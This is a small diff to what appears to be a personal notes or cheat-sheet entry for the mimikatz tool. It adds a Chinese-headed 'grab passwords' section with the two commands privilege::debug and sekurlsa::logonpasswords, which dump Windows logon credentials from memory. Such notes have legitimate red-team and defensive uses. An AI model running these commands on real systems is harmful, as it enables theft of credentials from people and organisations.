@@ -1,8 +1,11 @@
 name: mimikatz
-tags: [mimikatz,mimi2]
+tags: [mimikatz,mimi]
 data: |
 
+  抓取密码：
+  # privilege::debug
+  # sekurlsa::logonpasswords
 
-
+  
   Hello
   Windows
